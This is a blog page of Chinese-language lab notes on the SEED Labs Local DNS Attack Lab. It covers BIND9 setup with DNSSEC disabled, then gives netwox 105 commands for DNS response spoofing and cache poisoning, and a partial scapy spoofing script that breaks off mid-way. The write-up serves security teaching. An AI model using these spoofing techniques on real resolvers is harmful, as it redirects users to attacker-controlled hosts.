<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Local DNS Attack Lab | SmacUL&#39;s Blog</title>
    <meta name="description" content="你好">
    <link rel="icon" href="/assets/img/Logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.e8ff0ee6.css" as="style"><link rel="preload" href="/assets/js/app.27d58fa7.js" as="script"><link rel="preload" href="/assets/js/2.f1f09924.js" as="script"><link rel="preload" href="/assets/js/38.8bd5bba9.js" as="script"><link rel="prefetch" href="/assets/js/10.da04177b.js"><link rel="prefetch" href="/assets/js/11.33537db2.js"><link rel="prefetch" href="/assets/js/12.2c196981.js"><link rel="prefetch" href="/assets/js/13.501a5542.js"><link rel="prefetch" href="/assets/js/14.93a9b12d.js"><link rel="prefetch" href="/assets/js/15.7ddd6566.js"><link rel="prefetch" href="/assets/js/16.32ee58e2.js"><link rel="prefetch" href="/assets/js/17.c415498a.js"><link rel="prefetch" href="/assets/js/18.5ef64d19.js"><link rel="prefetch" href="/assets/js/19.521006c9.js"><link rel="prefetch" href="/assets/js/20.1aa33ed7.js"><link rel="prefetch" href="/assets/js/21.82b9d691.js"><link rel="prefetch" href="/assets/js/22.793f9d85.js"><link rel="prefetch" href="/assets/js/23.0ca70d66.js"><link rel="prefetch" href="/assets/js/24.d86f1591.js"><link rel="prefetch" href="/assets/js/25.2ce3a84b.js"><link rel="prefetch" href="/assets/js/26.12cdc3ac.js"><link rel="prefetch" href="/assets/js/27.7b341d36.js"><link rel="prefetch" href="/assets/js/28.61c57439.js"><link rel="prefetch" href="/assets/js/29.90d6873f.js"><link rel="prefetch" href="/assets/js/3.7db0d588.js"><link rel="prefetch" href="/assets/js/30.4f5e13f5.js"><link rel="prefetch" href="/assets/js/31.7ec86adf.js"><link rel="prefetch" href="/assets/js/32.0c179479.js"><link rel="prefetch" href="/assets/js/33.b68ce17c.js"><link rel="prefetch" href="/assets/js/34.6d314a9c.js"><link rel="prefetch" href="/assets/js/35.15ecee78.js"><link rel="prefetch" href="/assets/js/36.d6998519.js"><link rel="prefetch" href="/assets/js/37.e84aeb89.js"><link rel="prefetch" href="/assets/js/39.ffd3bce6.js"><link rel="prefetch" href="/assets/js/4.9b31f553.js"><link rel="prefetch" href="/assets/js/40.1b57eaa8.js"><link rel="prefetch" href="/assets/js/41.ac6f9062.js"><link rel="prefetch" href="/assets/js/42.8854bf5a.js"><link rel="prefetch" href="/assets/js/43.91bf82a7.js"><link rel="prefetch" href="/assets/js/44.c35012af.js"><link rel="prefetch" href="/assets/js/45.07b8e581.js"><link rel="prefetch" href="/assets/js/46.02916103.js"><link rel="prefetch" href="/assets/js/47.f1be0d43.js"><link rel="prefetch" href="/assets/js/48.7f7c7f55.js"><link rel="prefetch" href="/assets/js/49.6692487b.js"><link rel="prefetch" href="/assets/js/5.23b29502.js"><link rel="prefetch" href="/assets/js/50.6c2f6d29.js"><link rel="prefetch" href="/assets/js/51.f7be7c31.js"><link rel="prefetch" href="/assets/js/52.b9dad83f.js"><link rel="prefetch" href="/assets/js/53.8f778f89.js"><link rel="prefetch" href="/assets/js/54.9853cbd5.js"><link rel="prefetch" href="/assets/js/55.f1dfad52.js"><link rel="prefetch" href="/assets/js/56.a89162ce.js"><link rel="prefetch" href="/assets/js/57.b1f1111f.js"><link rel="prefetch" href="/assets/js/58.08f753ab.js"><link rel="prefetch" href="/assets/js/59.e2ff4e09.js"><link rel="prefetch" href="/assets/js/6.ca86ed4c.js"><link rel="prefetch" href="/assets/js/60.14c1ce69.js"><link rel="prefetch" href="/assets/js/61.06a9c523.js"><link rel="prefetch" href="/assets/js/62.af6d0bf2.js"><link rel="prefetch" href="/assets/js/63.47139735.js"><link rel="prefetch" href="/assets/js/64.1b3689b6.js"><link rel="prefetch" href="/assets/js/65.c599d8e8.js"><link rel="prefetch" href="/assets/js/66.91648506.js"><link rel="prefetch" href="/assets/js/67.ecf7742c.js"><link rel="prefetch" href="/assets/js/68.b8769d15.js"><link rel="prefetch" href="/assets/js/69.e055ff05.js"><link rel="prefetch" href="/assets/js/7.9d170f74.js"><link rel="prefetch" href="/assets/js/70.065d9e72.js"><link rel="prefetch" href="/assets/js/71.840612b5.js"><link rel="prefetch" href="/assets/js/72.2a605e0c.js"><link rel="prefetch" href="/assets/js/73.3e54fae5.js"><link rel="prefetch" href="/assets/js/74.8e626e7b.js"><link rel="prefetch" href="/assets/js/75.c64b57c0.js"><link rel="prefetch" href="/assets/js/76.0e7007be.js"><link rel="prefetch" href="/assets/js/77.c8b770b0.js"><link rel="prefetch" href="/assets/js/78.d7da3c62.js"><link rel="prefetch" href="/assets/js/79.a78c6d63.js"><link rel="prefetch" href="/assets/js/8.3616387d.js"><link rel="prefetch" href="/assets/js/80.dda2cb25.js"><link rel="prefetch" href="/assets/js/81.2f232306.js"><link rel="prefetch" href="/assets/js/82.df6bca63.js"><link rel="prefetch" href="/assets/js/83.6251af59.js"><link rel="prefetch" href="/assets/js/84.d3eda27f.js"><link rel="prefetch" href="/assets/js/85.71180abd.js"><link rel="prefetch" href="/assets/js/86.3c5a5f86.js"><link rel="prefetch" href="/assets/js/87.12474af5.js"><link rel="prefetch" href="/assets/js/9.c04fa05e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8ff0ee6.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">SmacUL's Blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/log/seed_labs/" class="sidebar-link">Seed Labs</a></li><li><a href="/log/seed_labs/Cross-Site Scripting Attack.html" class="sidebar-link">Cross-Site Scripting Attack</a></li><li><a href="/log/seed_labs/SQL Injection Attack Lab.html" class="sidebar-link">SQL Injection Attack Lab</a></li><li><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html" class="sidebar-link">Buffer-Overflow Vulnerability Lab</a></li><li><a href="/log/seed_labs/Packet Sniffing and Spoofing Lab.html" class="sidebar-link">Packet Sniffing and Spoofing Lab</a></li><li><a href="/log/seed_labs/Public-Key Infrastructure Lab.html" class="sidebar-link">Public-Key Infrastructure Lab</a></li><li><a href="/log/seed_labs/Local DNS Attack Lab.html" class="active sidebar-link">Local DNS Attack Lab</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#pre-experiment" class="sidebar-link">Pre-Experiment</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#setting-up-a-local-dns-server" class="sidebar-link">Setting Up a Local DNS Server</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t1-configure-the-user-machine" class="sidebar-link">T1 Configure the User Machine</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t2-set-up-a-local-dns-server" class="sidebar-link">T2 Set up a Local DNS Server</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t2-1-configure-the-bind9-server" class="sidebar-link">T2.1 Configure the BIND9 server</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t2-2-turn-off-dnssec" class="sidebar-link">T2.2 Turn off DNSSEC</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t2-3-start-dns-server" class="sidebar-link">T2.3 Start DNS server</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t2-4-use-the-dns-server" class="sidebar-link">T2.4 Use the DNS server</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t3-host-a-zone-in-the-local-dns-server" class="sidebar-link">T3 Host a Zone in the Local DNS Server</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t3-1-create-zones" class="sidebar-link">T3.1 Create zones</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t3-2-setup-the-forward-lookup-zone-file" class="sidebar-link">T3.2 Setup the forward lookup zone file</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t3-3-set-up-the-reverse-lookup-zone-file" class="sidebar-link">T3.3 Set up the reverse lookup zone file</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t3-4-restart-the-bind-server-and-test" class="sidebar-link">T3.4 Restart the BIND server and test</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#attacks-on-dns" class="sidebar-link">Attacks on DNS</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t4-modifying-the-host-file" class="sidebar-link">T4 Modifying the Host File</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t5-directly-spoofing-response-to-user" class="sidebar-link">T5 Directly Spoofing Response to User</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t6-dns-cache-poisoning-attack" class="sidebar-link">T6 DNS Cache Poisoning Attack</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t7-dns-cache-poisoning-targeting-the-authority-section" class="sidebar-link">T7 DNS Cache Poisoning: Targeting the Authority Section</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t8-targeting-another-domain" class="sidebar-link">T8 Targeting Another Domain</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Local DNS Attack Lab.html#t9-targeting-the-additional-section" class="sidebar-link">T9 Targeting the Additional Section</a></li></ul></li><li><a href="/log/seed_labs/Remote DNS Cache Poisoning Attack Lab.html" class="sidebar-link">Remote DNS Cache Poisoning Attack Lab</a></li><li><a href="/log/seed_labs/Android Repackaging Attack Lab.html" class="sidebar-link">Android Repackaging Attack Lab</a></li><li><a href="/log/seed_labs/Return-to-libc Attack Lab.html" class="sidebar-link">Return-to-libc Attack Lab</a></li><li><a href="/log/seed_labs/Virtual Private Network Lab.html" class="sidebar-link">Virtual Private Network Lab</a></li><li><a href="/log/seed_labs/Heartbleed Attack Lab.html" class="sidebar-link">Heartbleed Attack Lab</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="local-dns-attack-lab"><a href="#local-dns-attack-lab" class="header-anchor">#</a> Local DNS Attack Lab</h1> <h2 id="pre-experiment"><a href="#pre-experiment" class="header-anchor">#</a> Pre-Experiment</h2> <p>DNS 攻击的目的是引导受害者去一个攻击者给出的网址.</p> <p>实验的内容比较多, 需要三台 VM. 一台做 attacker, 一台 Victim, 一台做 DNS Server.</p> <ul><li>DNS 服务器: 10.0.2.11</li> <li>攻击者 00 机: 10.0.2.9</li> <li>受害者 01 机: 10.0.2.12</li></ul> <h2 id="setting-up-a-local-dns-server"><a href="#setting-up-a-local-dns-server" class="header-anchor">#</a> Setting Up a Local DNS Server</h2> <h2 id="t1-configure-the-user-machine"><a href="#t1-configure-the-user-machine" class="header-anchor">#</a> T1 Configure the User Machine</h2> <p>配置用户机. 设置用户虚拟机的本地 DNS 服务器. <code>/etc/resolv.conf</code> 文件可以做到这个. 修改一下 <code>nameserver 10.0.2.11</code>.</p> <p>但是 DHCP 会覆盖这个文件, 所以, 修改文件 <code>/etc/resolvconf/resolv.conf.d/head</code>, 添加 <code>nameserver 10.0.2.11</code>. 完事生效配置文件:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> resolvconf -u
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="t2-set-up-a-local-dns-server"><a href="#t2-set-up-a-local-dns-server" class="header-anchor">#</a> T2 Set up a Local DNS Server</h2> <p>设置一台本地 DNS 服务器</p> <h3 id="t2-1-configure-the-bind9-server"><a href="#t2-1-configure-the-bind9-server" class="header-anchor">#</a> T2.1 Configure the BIND9 server</h3> <p>配置 BIND9 服务器. BIND9 是一种 DNS 服务器软件, 虚拟机里已经装好了 BIND9. BIND9 的配置文件在 <code>/etc/bind/named.conf</code> 这个文件中包含了其他配置文件的路径:</p> <div class="language- line-numbers-mode"><div class="highlight-lines"><div class="highlighted"> </div><br><br><br></div><pre class="language-text"><code>include &quot;/etc/bind/named.conf.options&quot;;
include &quot;/etc/bind/named.conf.local&quot;;
include &quot;/etc/bind/named.conf.default-zones&quot;;
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>我们需要修改的是 <em>named.conf.options</em> 这个文件, 在这个文件中添加缓存内容文件的路径. 如果不指定, 默认缓存内容文件的路径为: <code>/var/cache/bind/named_dump.db</code>.</p> <div class="language- line-numbers-mode"><div class="highlight-lines"><br><br><div class="highlighted"> </div><br><br><br></div><pre class="language-text"><code>options {
    directory &quot;/var/cache/bind&quot;;
    dump-file &quot;/var/cache/bind/dump.db&quot;;
    ...
}
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>执行下方的两个指令:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> rndc dumpdb -cache     <span class="token comment"># 转存缓存到指定文件</span>
<span class="token function">sudo</span> rndc flush             <span class="token comment"># 清空缓存文件</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="t2-2-turn-off-dnssec"><a href="#t2-2-turn-off-dnssec" class="header-anchor">#</a> T2.2 Turn off DNSSEC</h3> <p>关闭 DNSSEC. DNSSEC 应该是一种防止 DNS 服务器遭受 <em>spoofing attcks</em> 的防御措施.</p> <p>还是在上文的 <em>named.conf.options</em> 文件, 找到并注释: <code>dnssec-validation auto;</code>,
添加 <code>dnssec-enable no;</code></p> <div class="custom-block warning"><p class="custom-block-title">这两个子操作的具体作用</p> <p>?</p></div> <h3 id="t2-3-start-dns-server"><a href="#t2-3-start-dns-server" class="header-anchor">#</a> T2.3 Start DNS server</h3> <p>启动 DNS 服务器. 有修改就重启.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> <span class="token function">service</span> bind9 restart
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="t2-4-use-the-dns-server"><a href="#t2-4-use-the-dns-server" class="header-anchor">#</a> T2.4 Use the DNS server</h3> <p>使用 DNS 服务器. 就是验证一下是不是真的走了 DNS? ping 了一下百度, 可以在 wireshark 上看见 DNS Server 和用户之间的数据交换.</p> <h2 id="t3-host-a-zone-in-the-local-dns-server"><a href="#t3-host-a-zone-in-the-local-dns-server" class="header-anchor">#</a> T3 Host a Zone in the Local DNS Server</h2> <p>在本地 DNS 服务器中托管区域?</p> <h3 id="t3-1-create-zones"><a href="#t3-1-create-zones" class="header-anchor">#</a> T3.1 Create zones</h3> <p>在 BIND9 的配置文件 <code>\etc\bind\named.conf</code> 中添加:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>zone <span class="token string">&quot;example.com&quot;</span> <span class="token punctuation">{</span> 
    <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
    <span class="token function">file</span> <span class="token string">&quot;/etc/bind/example.com.db&quot;</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
zone <span class="token string">&quot;0.168.192.in-addr.arpa&quot;</span> <span class="token punctuation">{</span> 
    <span class="token builtin class-name">type</span> master<span class="token punctuation">;</span>
    <span class="token function">file</span> <span class="token string">&quot;/etc/bind/192.168.0.db&quot;</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">这个东西是做什么? 特指 zone</p> <p>zone 应该可以理解成域名的片段, 可以是域名, 也可以是域名的一部分, 域名的每部分用 <code>.</code> 分割.</p></div> <h3 id="t3-2-setup-the-forward-lookup-zone-file"><a href="#t3-2-setup-the-forward-lookup-zone-file" class="header-anchor">#</a> T3.2 Setup the forward lookup zone file</h3> <p>设置前向 (由 hostname 到 IP) 的 zone 文件. 在 <code>/etc/bind/</code> 目录下创建 <code>example.com.db</code> 文件作为这里的 zone 文件. (<em>Seed Lab</em> 中提供)</p> <h3 id="t3-3-set-up-the-reverse-lookup-zone-file"><a href="#t3-3-set-up-the-reverse-lookup-zone-file" class="header-anchor">#</a> T3.3 Set up the reverse lookup zone file</h3> <p>设置后向 (由 IP 到 hostname) 的 zone 文件. 在 <code>/etc/bind</code> 目录下创建 <code>192.168.0.db</code> 文件作为这里的 zone 文件. (<em>Seed Lab</em> 中提供)</p> <div class="custom-block warning"><p class="custom-block-title">不是很理解这里的两个 zone 文件的作用</p> <p>指导文件中提到要建立一个 <em>authoritative name server</em>, 这个服务器将直接提供最终的 域名-IP 转换的结果, 而不依赖其他 DNS 提供的缓存. 这里的两个 zone 文件, 大概率和这有关. 但是, 为什么实验要这么做?</p></div> <h3 id="t3-4-restart-the-bind-server-and-test"><a href="#t3-4-restart-the-bind-server-and-test" class="header-anchor">#</a> T3.4 Restart the BIND server and test</h3> <p>重启 bind9 的服务. 用户机使用 <code>dig www.example.com</code> 命令, 可以得到:
<img src="/note/img/2020-02-15-10-09-21.png" alt=""></p> <p>如果单纯使用 <code>dig</code> 指令, 底下的 <em>SERVER</em> 将会显示 <code>127.0.0.1</code> 即本地.</p> <h2 id="attacks-on-dns"><a href="#attacks-on-dns" class="header-anchor">#</a> Attacks on DNS</h2> <p>在 DNS 攻击. 想办法让高德变成缺德. T4 和 T5 应该是一对平起平坐的攻击.</p> <h2 id="t4-modifying-the-host-file"><a href="#t4-modifying-the-host-file" class="header-anchor">#</a> T4 Modifying the Host File</h2> <p>修改 host 文件. 这个攻击中, 我们假设攻击者能够直接修改用户的 <code>/etc/hosts</code> 文件, 在里面直接将域名对应的 IP 修改为攻击者希望的 IP.</p> <p>要是能做到这一点, 攻击者基本也为所欲为了吧.</p> <h2 id="t5-directly-spoofing-response-to-user"><a href="#t5-directly-spoofing-response-to-user" class="header-anchor">#</a> T5 Directly Spoofing Response to User</h2> <p>直接给用户一个伪造的响应, 把用户拉倒另一个地方. 假设用户机与攻击者在一个 LAN 下, 在用户机向 DNS 请求一次域名转换, 希望获得域名对应的 IP. 在这个过程中, 攻击者抢先给出一个 DNS 响应消息, 在响应中, 正确的 IP 被修改成了攻击者希望用户访问的 IP.</p> <h4 id="对-dns-回复的要求"><a href="#对-dns-回复的要求" class="header-anchor">#</a> 对 DNS 回复的要求</h4> <ol><li>source IP = DNS IP</li> <li>destination IP = 用户 IP</li> <li>source port  = DNS 服务器端口</li> <li>destination port = 用户机发出 DNS 请求的端口</li> <li>正确计算 UDP 报文中的检验和?</li> <li>transaction ID = DNS 请求中的 transaction ID</li> <li>响应中, 问题部分的域名 = 请求中, 问题部分的域名</li> <li>响应中, 答案部分的域名 = 请求中, 问题部分的域名</li> <li>攻击者的响应要比真实的 DNS Server 快</li></ol> <hr> <p>利用 <a href="http://www.cis.syr.edu/~wedu/Teaching/cis758/netw522/netwox-doc_html/tools/105.html" target="_blank" rel="noopener noreferrer">Netwox 105<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 工具, 提供了监听 DNS 请求和伪装 DNS 响应的功能.</p> <p>实验中我们使用 dig 代替用户发起一次 DNS 请求, 请求域名为 <code>example.net</code></p> <p>攻击者:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">sudo</span> netwox <span class="token number">105</span> -h <span class="token string">&quot;VM&quot;</span> -H <span class="token string">&quot;10.0.2.12&quot;</span> -a <span class="token string">&quot;example.net&quot;</span> -A <span class="token string">&quot;1.2.3.4&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">netwox 105</p> <p>这个 hostname 和 authoritative name 分别代指什么?</p></div> <p>受害者:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">dig</span> www.example.net
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/note/img/2020-02-16-09-58-59.png" alt=""></p> <h2 id="t6-dns-cache-poisoning-attack"><a href="#t6-dns-cache-poisoning-attack" class="header-anchor">#</a> T6 DNS Cache Poisoning Attack</h2> <p>DNS 缓存毒化攻击. 之前的方式都是攻击普通用户设备, 现在我们希望能直接攻击 DNS 服务器, 修改当中的电话本.</p> <p>一台 DNS 服务器即可以是一台服务器, 也可以是一台客户机. 当它收到用户的 DNS 查询请求的时候会先查看自己的缓存, 如果缓存不存在, 则向上级 DNS 服务查询, 并将上级 DNS 服务器返回的结果添加入自己的缓存, 同时响应用户请求.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token comment"># 先清除我们的 DNS 服务器上的缓存:</span>
$ <span class="token function">sudo</span> rndc flush
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token comment"># 攻击者</span>
$ <span class="token function">sudo</span> netwox <span class="token number">105</span> -h <span class="token string">&quot;VM&quot;</span> -H <span class="token string">&quot;10.0.2.11&quot;</span> -a <span class="token string">&quot;example.net&quot;</span> -A <span class="token string">&quot;1.2.2.5&quot;</span> -T <span class="token number">600</span> -s <span class="token string">&quot;raw&quot;</span> -f <span class="token string">&quot;src host 10.0.2.11&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token comment"># DNS 服务器查看结果</span>
$ <span class="token function">sudo</span> rndc dumpdb -cache
$ <span class="token function">sudo</span> <span class="token function">cat</span> /var/cache/bind/dump.db
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/note/img/2020-02-16-11-36-30.png" alt=""></p> <h2 id="t7-dns-cache-poisoning-targeting-the-authority-section"><a href="#t7-dns-cache-poisoning-targeting-the-authority-section" class="header-anchor">#</a> T7 DNS Cache Poisoning: Targeting the Authority Section</h2> <p>DNS 缓存毒化: 权威结点. 以前的攻击方式只能针对一个域名进行处理, 效率比较低. 这次直接攻击 DNS 依赖的 <em>Authority section</em>, 希望一次攻击能够处理一个域. <a href="http://c.biancheng.net/view/6457.html" target="_blank" rel="noopener noreferrer">DNS 报文结构<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><em>Task7.py</em></p> <div class="language-py line-numbers-mode"><pre class="language-py"><code><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">def</span> <span class="token function">spoof_dns</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>DNS <span class="token keyword">in</span> pkt <span class="token keyword">and</span> <span class="token string">b'www.example.net'</span> <span class="token keyword">in</span> pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">.</span>qname<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;I am in&quot;</span><span class="token punctuation">)</span>
        <span class="token comment"># 交换源 IP 和目的 IP</span>
        IPpkt <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">,</span> src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">)</span>
        <span class="token comment"># 交换源端口和目的端口</span>
        UDPpkt <span class="token operator">=</span> UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span>pkt<span class="token punctuation">[</span>UDP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">,</span> sport<span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">)</span>
        <span class="token comment"># The Answer Section</span>
        Anssec <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span>pkt<span class="token punctuation">[</span>DNS<span class="token punctuation">]</span><span class="token punctuation">.</span>qd<span class="token punctuation">.</span>qname<span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'1.2.3.6'</span><span class="token punctuation">)</span>
        <span class="token comment"># The Authority Section</span>
        NSsec1 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns1.example.net'</span><span class="token punctuation">)</span> 
        NSsec2 <span class="token operator">=</span> DNSRR<span class="token punctuation">(</span>rrname<span class="token operator">=</span><span class="token string">'example.net'</span><span class="token punctuation">,</span> 
                        <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">'NS'</span><span class="token punctuation">,</span> ttl<span class="token operator">=</span><span class="token number">259200</span><span class="token punctuation">,</span> rdata<span class="token operator">=</span><span class="token string">'ns2.example.net'</span><span class="token punctuation">)</span>
        <span class="token comment"># The Additional Section</span>
